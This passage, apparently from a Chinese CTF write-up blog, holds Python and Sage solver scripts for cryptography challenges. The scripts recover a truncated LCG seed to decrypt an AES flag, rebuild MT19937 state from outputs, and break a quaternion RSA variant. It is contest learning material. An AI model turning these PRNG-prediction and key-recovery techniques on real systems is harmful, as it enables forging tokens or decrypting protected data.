w[:-<span class="number">1</span>]</span><br><span class="line">        lhs = <span class="built_in">sum</span>([w[i]*A**(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]) % <span class="number">2</span>**(n//<span class="number">2</span>+k)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">max</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">abs</span>, w))) == WW <span class="keyword">and</span> lhs == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found w successfully&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> w</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;No suitable w found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># w = get_w(n, m, k, WW, a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># known_lsb9 = None</span></span><br><span class="line"><span class="comment"># for windows in trange(0, 64-m):</span></span><br><span class="line"><span class="comment">#     candidate = []</span></span><br><span class="line"><span class="comment">#     for guessX0 in range(2**step):</span></span><br><span class="line"><span class="comment">#         for guessB in range(2**step):</span></span><br><span class="line"><span class="comment">#             X = [guessX0]</span></span><br><span class="line"><span class="comment">#             for _ in range(1, 64+1):</span></span><br><span class="line"><span class="comment">#                 X.append((X[-1]*a + guessB) % 2**k)</span></span><br><span class="line"><span class="comment">#             X_star = [((output[i] ^ X[i]) % 2**k)*2**(n//2) for i in range(64)]</span></span><br><span class="line"><span class="comment">#             Z = sum(w[i-windows]*(X_star[i+1] - X_star[i]) for i in range(windows, windows+m)) % 2**(n//2+k)</span></span><br><span class="line"><span class="comment">#             delta = min(Z, abs(Z-2**(n//2+k)))</span></span><br><span class="line"><span class="comment">#             if delta &lt; 2*m*WW*2**(n//2):</span></span><br><span class="line"><span class="comment">#                 candidate.append((X[0], guessB))</span></span><br><span class="line"><span class="comment">#     if known_lsb9 is None:</span></span><br><span class="line"><span class="comment">#         known_lsb9 = list(set(candidate))</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         known_lsb9 = list(set(known_lsb9) &amp; set(candidate))</span></span><br><span class="line"><span class="comment">#     print(len(known_lsb9))</span></span><br><span class="line"><span class="comment">#     if len(known_lsb9) == 16:    # after observing, we found 16 is the minimum, even not 16 is small enough</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(known_lsb9)</span></span><br><span class="line"></span><br><span class="line">known_lsb9 = [(<span class="number">53</span>, <span class="number">69</span>), (<span class="number">458</span>, <span class="number">255</span>), (<span class="number">201</span>, <span class="number">67</span>), (<span class="number">310</span>, <span class="number">1</span>), (<span class="number">54</span>, <span class="number">257</span>), (<span class="number">202</span>, <span class="number">255</span>), (<span class="number">310</span>, <span class="number">257</span>), (<span class="number">309</span>, <span class="number">325</span>), (<span class="number">54</span>, <span class="number">1</span>), (<span class="number">53</span>, <span class="number">325</span>), (<span class="number">457</span>, <span class="number">67</span>), (<span class="number">458</span>, <span class="number">511</span>), (<span class="number">201</span>, <span class="number">323</span>), (<span class="number">202</span>, <span class="number">511</span>), (<span class="number">457</span>, <span class="number">323</span>), (<span class="number">309</span>, <span class="number">69</span>)]</span><br><span class="line">known_lsb16 = []</span><br><span class="line">m = <span class="number">32</span></span><br><span class="line">k = <span class="number">16</span></span><br><span class="line">WW = <span class="number">3</span></span><br><span class="line">step = <span class="number">7</span></span><br><span class="line">w = get_w(n, m, k, WW, a)</span><br><span class="line"><span class="keyword">for</span> X0low, Blow <span class="keyword">in</span> known_lsb9:</span><br><span class="line">    tmp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> windows <span class="keyword">in</span> trange(<span class="number">0</span>, <span class="number">64</span>-m):</span><br><span class="line">        candidate = []</span><br><span class="line">        <span class="keyword">for</span> guessX0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**step):</span><br><span class="line">            <span class="keyword">for</span> guessB <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**step):</span><br><span class="line">                X = [guessX0*<span class="number">2</span>**<span class="number">9</span> + X0low]</span><br><span class="line">                guessB = guessB * <span class="number">2</span>**<span class="number">9</span> + Blow</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">64</span>+<span class="number">1</span>):</span><br><span class="line">                    X.append((X[-<span class="number">1</span>]*a + guessB) % <span class="number">2</span>**k)</span><br><span class="line">                X_star = [((output[i] ^ X[i]) % <span class="number">2</span>**k)*<span class="number">2</span>**(n//<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">                Z = <span class="built_in">sum</span>(w[i-windows]*(X_star[i+<span class="number">1</span>] - X_star[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(windows, windows+m)) % <span class="number">2</span>**(n//<span class="number">2</span>+k)</span><br><span class="line">                delta = <span class="built_in">min</span>(Z, <span class="built_in">abs</span>(Z-<span class="number">2</span>**(n//<span class="number">2</span>+k)))</span><br><span class="line">                <span class="keyword">if</span> delta &lt; <span class="number">2</span>*m*WW*<span class="number">2</span>**(n//<span class="number">2</span>):</span><br><span class="line">                    candidate.append((X[<span class="number">0</span>], guessB))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            tmp = <span class="built_in">list</span>(<span class="built_in">set</span>(candidate))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = <span class="built_in">list</span>(<span class="built_in">set</span>(tmp) &amp; <span class="built_in">set</span>(candidate))</span><br><span class="line">        <span class="comment"># print(len(tmp))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tmp) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(tmp) == <span class="number">4</span>:    <span class="comment"># 4 groups is the best situation</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    known_lsb16 += tmp</span><br><span class="line"><span class="built_in">print</span>(known_lsb16)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">known_lsbx2knownlsbk</span>(<span class="params">known_lsbx, m, k, WW, step=<span class="number">4</span></span>):</span><br><span class="line">    w = get_w(n, m, k, WW, a)</span><br><span class="line">    known_lsbk = []</span><br><span class="line">    <span class="keyword">for</span> X0low, Blow <span class="keyword">in</span> known_lsbx:</span><br><span class="line">        tmp = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> windows <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>-m):</span><br><span class="line">            candidate = []</span><br><span class="line">            <span class="keyword">for</span> guessX0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**step):</span><br><span class="line">                <span class="keyword">for</span> guessB <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**step):</span><br><span class="line">                    X = [guessX0*<span class="number">2</span>**(k-step) + X0low]</span><br><span class="line">                    guessB = guessB * <span class="number">2</span>**(k-step) + Blow</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">64</span>+<span class="number">1</span>):</span><br><span class="line">                        X.append((X[-<span class="number">1</span>]*a + guessB) % <span class="number">2</span>**k)</span><br><span class="line">                    X_star = [((output[i] ^ X[i]) % <span class="number">2</span>**k)*<span class="number">2</span>**(n//<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">                    Z = <span class="built_in">sum</span>(w[i-windows]*(X_star[i+<span class="number">1</span>] - X_star[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(windows, windows+m)) % <span class="number">2</span>**(n//<span class="number">2</span>+k)</span><br><span class="line">                    delta = <span class="built_in">min</span>(Z, <span class="built_in">abs</span>(Z-<span class="number">2</span>**(n//<span class="number">2</span>+k)))</span><br><span class="line">                    <span class="keyword">if</span> delta &lt; <span class="number">2</span>*m*WW*<span class="number">2</span>**(n//<span class="number">2</span>):</span><br><span class="line">                        candidate.append((X[<span class="number">0</span>], guessB))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> tmp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                tmp = <span class="built_in">list</span>(<span class="built_in">set</span>(candidate))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = <span class="built_in">list</span>(<span class="built_in">set</span>(tmp) &amp; <span class="built_in">set</span>(candidate))</span><br><span class="line">            <span class="comment"># print(len(tmp))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(tmp) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(tmp) == <span class="number">4</span>:    <span class="comment"># 4 groups is the best situation</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        known_lsbk += tmp</span><br><span class="line">    <span class="keyword">return</span> known_lsbk</span><br><span class="line"></span><br><span class="line"><span class="comment"># known_lsb16 = [(14949, 29941), (47717, 62709), (14949, 62709), (47717, 29941), (50586, 335), (17818, 33103), (17818, 335), (50586, 33103), (47718, 32433), (14950, 32433), (14950, 65201), (47718, 65201), (50585, 63379), (17817, 30611), (50585, 30611), (17817, 63379)]</span></span><br><span class="line">known_lsb20 = known_lsbx2knownlsbk(known_lsb16, <span class="number">48</span>, <span class="number">20</span>, <span class="number">2</span>)  <span class="comment"># For a fix k, adjust m and WW until it works</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb20))</span><br><span class="line">known_lsb24 = known_lsbx2knownlsbk(known_lsb20, <span class="number">32</span>, <span class="number">24</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb24))</span><br><span class="line">known_lsb28 = known_lsbx2knownlsbk(known_lsb24, <span class="number">40</span>, <span class="number">28</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb28))</span><br><span class="line">known_lsb32 = known_lsbx2knownlsbk(known_lsb28, <span class="number">40</span>, <span class="number">32</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb32))</span><br><span class="line">known_lsb36 = known_lsbx2knownlsbk(known_lsb32, <span class="number">40</span>, <span class="number">36</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb36))</span><br><span class="line">known_lsb40 = known_lsbx2knownlsbk(known_lsb36, <span class="number">40</span>, <span class="number">40</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb40))</span><br><span class="line">known_lsb44 = known_lsbx2knownlsbk(known_lsb40, <span class="number">40</span>, <span class="number">44</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb44))</span><br><span class="line">known_lsb48 = known_lsbx2knownlsbk(known_lsb44, <span class="number">40</span>, <span class="number">48</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb48))</span><br><span class="line">known_lsb52 = known_lsbx2knownlsbk(known_lsb48, <span class="number">40</span>, <span class="number">52</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb52))</span><br><span class="line">known_lsb56 = known_lsbx2knownlsbk(known_lsb52, <span class="number">40</span>, <span class="number">56</span>, <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb56))</span><br><span class="line">known_lsb60 = known_lsbx2knownlsbk(known_lsb56, <span class="number">40</span>, <span class="number">60</span>, <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb60))</span><br><span class="line">known_lsb64 = known_lsbx2knownlsbk(known_lsb60, <span class="number">40</span>, <span class="number">64</span>, <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(known_lsb64))</span><br><span class="line"><span class="built_in">print</span>(known_lsb64)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;l\x8bd,\xa3\xe7\x87*\xca\n\xd7\x11\xd6n=\xeaS`\xa4w\x94(\xb9\xf9\xb9\xc6\xe3\xc2\xfb\xdb\x80\xf6\x9f\xc7\xd1F&quot;`&#123;;V\xa7&#125;Z\xc0\xc0\xf6&lt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seed, b_low <span class="keyword">in</span> known_lsb64:</span><br><span class="line">    X0_low = seed</span><br><span class="line">    X0_high = (seed ^ output[<span class="number">0</span>]) % <span class="number">2</span>**<span class="number">64</span></span><br><span class="line">    X0 = (X0_high &lt;&lt; <span class="number">64</span>) | X0_low</span><br><span class="line">    X1_low = (a*X0 + b_low) % <span class="number">2</span>**<span class="number">64</span></span><br><span class="line">    X1_high = (X1_low ^ output[<span class="number">1</span>]) % <span class="number">2</span>**<span class="number">64</span></span><br><span class="line">    X1 = (X1_high &lt;&lt; <span class="number">64</span>) | X1_low</span><br><span class="line">    b = (X1 - a*X0) % <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">    seed = (X0 - b)*<span class="built_in">pow</span>(a, -<span class="number">1</span>, <span class="number">2</span>**<span class="number">128</span>) % <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">    lcg = LCG(seed, a, b)</span><br><span class="line">    <span class="keyword">if</span> [lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">0</span>] * <span class="number">64</span>] == output:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).decrypt(enc)</span><br><span class="line">            <span class="built_in">print</span>(unpad(flag, <span class="number">16</span>).decode())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>又是 MT19937 小练习，复用 Division 的代码就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;../Division/MT19937-Symbolic-Execution-and-Solver-master/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> output <span class="keyword">import</span> r, enc</span><br><span class="line"></span><br><span class="line">r = [<span class="number">255</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> r]</span><br><span class="line">rng = MT19937(state_from_data = (r, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n//<span class="number">32</span>):</span><br><span class="line">        num = (rng() &lt;&lt; (<span class="number">32</span> * i)) | num</span><br><span class="line">    num = rng() &gt;&gt; (<span class="number">32</span> - (n % <span class="number">32</span>)) &lt;&lt; n//<span class="number">32</span>*<span class="number">32</span> | num</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">rng.reverse_states(enc.bit_length()//<span class="number">32</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">randnum = getrandbits(<span class="number">175</span>)  <span class="comment"># 密文是 172 位，由于第一个字符一定是 0xxx xxxx，所以多取 3 位</span></span><br><span class="line">flag = enc ^ randnum</span><br><span class="line">flag = long_to_bytes(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;___0h_51mple_r@nd0m___&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="复复复复数"><a href="#复复复复数" class="headerlink" title="复复复复数"></a>复复复复数</h3><p>问问 DeepSeek，直接就逆出了 <code>hints</code>，但是 flag 还是还原不出来，一看原来 $e$ 跟 $\varphi(n)$ 不互素，呃呃了，感觉国内出题都喜欢这样<br>再看看能不能偷鸡，一看 $e$ 和每个素因子的 <code>phi</code> GCD 都是 3，好吧，老老实实开个根<br>先还原出 $m^9$，再开两次三次方根即可，多拷打两下 DeepSeek 就把代码给出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定数据</span></span><br><span class="line">h0 = <span class="number">375413371936</span></span><br><span class="line">h1 = <span class="number">452903063925</span></span><br><span class="line">h2 = <span class="number">418564633198</span></span><br><span class="line">h3 = <span class="number">452841062207</span></span><br><span class="line">P = <span class="number">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line">g0 = <span class="number">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span></span><br><span class="line">g1 = <span class="number">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span></span><br><span class="line">g2 = <span class="number">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span></span><br><span class="line">g3 = <span class="number">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span></span><br><span class="line">n = <span class="number">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line">e = <span class="number">65547</span></span><br><span class="line"></span><br><span class="line">R = Zmod(P)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建方程组矩阵（前三方程）</span></span><br><span class="line">A = matrix(R, [</span><br><span class="line">    [h1, h2, h3],</span><br><span class="line">    [h0, -h3, h2],</span><br><span class="line">    [h3, h0, -h1]</span><br><span class="line">])</span><br><span class="line">b = vector(R, [(-g0) % P, g1 % P, g2 % P])</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p, q, r = A.solve_right(b)</span><br><span class="line">    <span class="comment"># 验证第四个方程</span></span><br><span class="line">    <span class="keyword">if</span> (h0*r + h1*q - h2*p) % P == g3 % P:</span><br><span class="line">        <span class="comment"># 验证n = p*q*r</span></span><br><span class="line">        <span class="keyword">if</span> (p * q * r) == n:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Success! p=<span class="subst">&#123;p&#125;</span>, q=<span class="subst">&#123;q&#125;</span>, r=<span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Solution does not match n.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Solution does not satisfy all equations.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 四元数类定义（需在Sage中实现或使用Python处理）</span></span><br><span class="line"><span class="comment"># 此处需将c的分量代入，计算c^d mod n，然后转换为字节</span></span><br><span class="line"><span class="comment"># 以下为伪代码示例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(<span class="variable language_">self</span>.value[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="variable language_">self</span>.value[<span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="variable language_">self</span>.value,x.value)])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = <span class="variable language_">self</span>.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-<span class="variable language_">self</span>.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-<span class="variable language_">self</span>.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-<span class="variable language_">self</span>.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = <span class="variable language_">self</span>.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+<span class="variable language_">self</span>.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+<span class="variable language_">self</span>.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-<span class="variable language_">self</span>.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = <span class="variable language_">self</span>.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-<span class="variable language_">self</span>.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+<span class="variable language_">self</span>.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+<span class="variable language_">self</span>.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = <span class="variable language_">self</span>.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+<span class="variable language_">self</span>.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-<span class="variable language_">self</span>.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+<span class="variable language_">self</span>.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable language_">self</span>.value])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):</span><br><span class="line">        tmp = ComComplex(<span class="variable language_">self</span>.value)</span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                a *= tmp</span><br><span class="line">            tmp *= tmp</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                a %= n</span><br><span class="line">                tmp %= n</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 解密步骤（假设已获得p, q, r）</span></span><br><span class="line">phi = (p**<span class="number">4</span>-<span class="number">1</span>)*(q**<span class="number">4</span>-<span class="number">1</span>)*(r**<span class="number">4</span>-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65547</span> // <span class="number">9</span></span><br><span class="line"><span class="built_in">print</span>(gcd(e, phi))</span><br><span class="line">d = <span class="built_in">pow</span>(<span class="built_in">int</span>(e), -<span class="number">1</span>, <span class="built_in">int</span>(phi))</span><br><span class="line"><span class="comment"># c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385k</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c = ComComplex([<span class="number">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span>,<span class="number">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span>,<span class="number">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span>, <span class="number">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span>])  <span class="comment"># 输入题目中的c值</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(p)</span><br><span class="line">phi_p = p**<span class="number">4</span>-<span class="number">1</span></span><br><span class="line">e = <span class="number">65547</span> // <span class="number">9</span></span><br><span class="line">dp = <span class="built_in">int</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(e), -<span class="number">1</span>, <span class="built_in">int</span>(phi_p)))</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> getroot3 <span class="keyword">import</span> get_root3</span><br><span class="line"></span><br><span class="line">m3 = get_root3(p, [mp.value[<span class="number">0</span>], mp.value[<span class="number">1</span>], mp.value[<span class="number">2</span>], mp.value[<span class="number">3</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(m3))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 